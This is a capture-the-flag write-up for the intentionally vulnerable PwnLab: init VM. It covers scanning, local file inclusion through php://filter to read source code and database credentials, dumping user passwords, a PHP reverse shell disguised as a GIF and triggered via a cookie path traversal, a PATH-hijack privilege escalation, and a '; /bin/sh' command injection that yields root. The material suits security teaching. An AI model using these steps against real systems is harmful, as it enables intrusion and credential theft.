# PwnLab: init [writeup]
Try to find IP of virtual machine:
```sh
$ nmap 192.168.2.0/24
Nmap scan report for pwnlab (192.168.2.166)
Host is up (0.00034s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  rpcbind
3306/tcp open  mysql
```
So, we see, that IP of vm is 192.168.2.166 and 80 port is open. Let's examine it manually.
Trying to login to the site with credentials admin/admin, user/user and failed on login page.
Running nikto scanner:
```sh
$ nikto -h 192.168.2.166
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.2.166
+ Target Hostname:    192.168.2.166
+ Target Port:        80
+ Start Time:         2017-05-16 21:29:35 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.0.1/images/".
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Cookie PHPSESSID created without the httponly flag
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2017-05-16 21:29:45 (GMT3) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Inspecting results of nikto didn't give any profit. Attempts to make some SQL injections also failed.After some site inspecting, see, that url http://192.168.2.166/?page=login can give some kind of LFI or RFI.  Ater some searching attempt http://192.168.2.166/?page=php://filter/convert.base64-encode/resource=index gave next results:
```php
$ echo PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4= | base64 --decode
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html>
```
So, try to get login page with the same way: http://192.168.2.166/?page=php://filter/convert.base64-encode/resource=login:
```php
<?php
session_start();
require("config.php");
$mysqli = new mysqli($server, $username, $password, $database);
```
We see config.php with content
```sh<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```
So try to connet to mysql server:
```sh
$ mysql  -u root -p -h 192.168.2.166
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 82
Server version: 5.5.47-0+deb8u1 (Debian)
Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.
Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> use Users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed
mysql> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0,01 sec)
```
Lets try to login with some of this credentials, for example kent/JWzXuBJJNy. It works.
After huge amount of tries to upload php code, inspecting source code, see, that it is possible to upload php reverse shell and call it to next way: 
1. Form php shell: (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), add GIF before sript and save with .gif extenstion.
2. Upload file and get path: /upload/f3035846cc279a1aff73b7c2c25367b9.
3. Open port to listen on host
4. Make get request to virtual machine and set cookie with value : Cookie: lang=../upload/f3035846cc279a1aff73b7c2c25367b9.gif
Result:
```sh
$ nc -lvp 44444
Listening on [0.0.0.0] (family 0, port 44444)
Connection from [192.168.2.166] port 44444 [tcp/*] accepted (family 2, sport 42266)
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
 12:03:59 up  2:38,  0 users,  load average: 0.00, 0.01, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
 Improve terminal to make in more usable:
 ```sh
 $ python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 Trying to login users with sql passwords:
```sh
$ su mike
su mike
Password: SIfdsTEn6I
su: Authentication failure
$ su kane
su kane
Password: iSv5Ym2GRo
kane@pwnlab:~$ ls -la
ls -la
total 28
drwxr-x--- 2 kane kane 4096 Mar 17  2016 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw-r--r-- 1 kane kane  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 kane kane 3515 Mar 17  2016 .bashrc
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
-rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile
kane@pwnlab:~$ file msgmike
file msgmike
msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped
```
 Try to obtain mike privileges:
 ```sh
kane@pwnlab:~$ echo "/bin/sh" > cat
echo "/bin/sh" > cat
kane@pwnlab:~$ chmod 777 cat
chmod 777 cat
kane@pwnlab:~$ export PATH=.:$PATH
export PATH=.:$PATH
kane@pwnlab:~$ ./msgmike
./msgmike
$ id
id
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
 ```
Inspecting mike's directory obtain the root:
```sh
$ ./msg2root
./msg2root
Message for root: ; /bin/sh
; /bin/sh
# id
id
uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
# cat /root/flag.txt
cat /root/flag.txt
.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
(_ ___)  _____                             _                            (_ ___)
(__  _) /  __ \                           | |                           (__  _)
( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
( _ __)                     __/ |                                       ( _ __)
(__  _)                    |___/                                        (__  _)
(__  _)                                                                 (__  _)
(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
(__  _) this challenge.                                                 (__  _)
(_ ___)                                                                 (_ ___)
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
(__  _) reading it                                                      (__  _)
(__  _)                                                                 (__  _)
(__  _)                                             For sniferl4bs.com  (__  _)
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'
# 
```
